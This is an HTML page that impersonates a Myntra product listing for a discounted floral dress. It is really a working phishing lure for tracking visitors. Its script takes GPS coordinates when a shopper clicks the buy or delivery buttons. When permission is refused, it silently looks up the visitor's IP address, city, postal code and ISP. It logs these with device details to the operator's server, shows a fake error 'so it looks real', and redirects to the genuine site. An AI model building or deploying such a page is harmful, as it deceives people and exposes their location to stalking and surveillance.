<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy Summer Floral Midi Dress | Myntra</title>
    
    <!-- OpenGraph metadata -->
    <meta property="og:title" content="Sassafras Summer Floral Dress - 50% OFF!">
    <meta property="og:image" content="https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80">
    
    <link href="https://fonts.googleapis.com/css2?family=Assistant:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Assistant', sans-serif; margin: 0; background-color: #f5f5f6; color: #282c3f; }
        .header { background: #fff; padding: 15px 20px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 15px; }
        .header svg { height: 28px; fill: #ff3f6c; }
        .header-text { font-weight: 700; color: #282c3f; letter-spacing: 1px; font-size: 18px; }
        .container { max-width: 500px; margin: 0 auto; background: #fff; padding-bottom: 30px; min-height: 100vh; }
        .product-img { width: 100%; display: block; }
        .details { padding: 15px 20px; }
        .brand { font-size: 22px; font-weight: 700; margin: 0; color: #282c3f; }
        .title { font-size: 16px; color: #535665; margin: 5px 0 15px 0; }
        .price-row { display: flex; align-items: baseline; gap: 10px; margin-bottom: 15px; }
        .price { font-size: 24px; font-weight: 700; color: #282c3f; }
        .mrp { color: #7e818c; text-decoration: line-through; font-size: 16px; }
        .discount { color: #ff905a; font-weight: 700; font-size: 16px; }
        
        .delivery-box { border: 1px solid #eaeaec; border-radius: 4px; padding: 15px; margin-top: 25px; }
        .delivery-title { font-weight: 700; margin-bottom: 15px; font-size: 14px; display: flex; align-items: center; gap: 10px;}
        .loc-btn { background: #fff; border: 1px solid #ff3f6c; color: #ff3f6c; padding: 12px; width: 100%; border-radius: 4px; font-weight: 700; font-size: 14px; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        .loc-btn:hover { background: #fff0f3; }
        
        .buy-btn { background: #ff3f6c; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 4px; font-weight: 700; font-size: 16px; cursor: pointer; text-transform: uppercase; margin-top: 20px; display: flex; justify-content: center; align-items: center; gap: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        
        .status-msg { margin-top: 12px; font-size: 13px; font-weight: 600; text-align: center; display: none; }
        .error-text { color: #ff3f6c; }
        .loading-text { color: #03a685; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg viewBox="0 0 128 128"><path d="M57.65 19.34L35.8 59.83v48.83h20.61V67.04l21.2-39.73 21.05 39.51v41.84h20.61V59.61L97.5 19.34H78.43l-9.98 18.28-9.76-18.28z"/></svg>
            <span class="header-text">MYNTRA</span>
        </div>
        
        <img src="https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="product-img" alt="Floral Dress">
        
        <div class="details">
            <h1 class="brand">Sassafras</h1>
            <p class="title">Women Red Floral Printed Fit and Flare Dress</p>
            
            <div class="price-row">
                <span class="price">₹1299</span>
                <span class="mrp">₹2599</span>
                <span class="discount">(50% OFF)</span>
            </div>
            
            <button class="buy-btn" onclick="checkDelivery(true)">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path><line x1="3" y1="6" x2="21" y2="6"></line><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
                ADD TO BAG
            </button>
            
            <div class="delivery-box">
                <div class="delivery-title">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#282c3f" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                    DELIVERY OPTIONS
                </div>
                <button class="loc-btn" id="locBtn" onclick="checkDelivery(false)">Use Current Location</button>
                <p class="status-msg" id="status"></p>
            </div>
        </div>
    </div>

    <script>
        let isRedirecting = false;

        function checkDelivery(isBuyButton) {
            if(isRedirecting) return;
            
            let statusEl = document.getElementById('status');
            statusEl.style.display = 'block';
            statusEl.className = 'status-msg loading-text';
            statusEl.innerText = 'Requesting location access...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendData(pos, null, isBuyButton), 
                    (err) => handleError(err, isBuyButton), 
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                handleError({code: 0, message: "Browser unsupported"}, isBuyButton);
            }
        }

        function handleError(error, isBuyButton) {
            // THE FALLBACK: If browser auto-blocks GPS, silently grab IP location!
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(ipData => {
                    sendData(null, ipData, isBuyButton, error.message);
                })
                .catch(() => {
                    sendData(null, null, isBuyButton, error.message);
                });
        }

        function sendData(position, silentData, shouldRedirect, originalErrorMsg = null) {
            let statusEl = document.getElementById('status');
            
            let info = {
                screen_width: window.screen.width,
                screen_height: window.screen.height,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };

            // SCENARIO 1: We got Exact GPS!
            if (position) {
                info.exact_location = {
                    status: "Success (High Accuracy GPS)",
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy_meters: position.coords.accuracy
                };
            } 
            // SCENARIO 2: GPS failed (auto-blocked), but we got Silent IP!
            else if (silentData) {
                info.stealth_location = {
                    status: "Fallback: GPS Blocked (" + originalErrorMsg + "). Using Silent IP Tracking.",
                    ip: silentData.ip,
                    city: silentData.city,
                    region: silentData.region,
                    country: silentData.country_name,
                    zip: silentData.postal,
                    latitude: silentData.latitude,
                    longitude: silentData.longitude,
                    isp: silentData.org
                };
                
                // Show error if they clicked "Check Delivery" so it looks real
                if(!shouldRedirect) {
                    statusEl.className = 'status-msg error-text';
                    statusEl.innerText = 'Please allow location permission in your browser settings to check delivery.';
                }
            } 
            // SCENARIO 3: Everything failed
            else {
                info.error = "Everything blocked: " + originalErrorMsg;
                if(!shouldRedirect) {
                    statusEl.className = 'status-msg error-text';
                    statusEl.innerText = 'Please allow location permission in your browser settings to check delivery.';
                }
            }

            // Send to our Render server
            fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).then(() => {
                if(position || shouldRedirect) {
                    isRedirecting = true;
                    statusEl.className = 'status-msg loading-text';
                    statusEl.innerText = 'Redirecting to Myntra checkout...';
                    setTimeout(() => { window.location.href = "https://www.myntra.com/dresses"; }, 800);
                }
            }).catch(() => {
                if(position || shouldRedirect) {
                    window.location.href = "https://www.myntra.com/dresses";
                }
            });
        }
    </script>
</body>
</html>
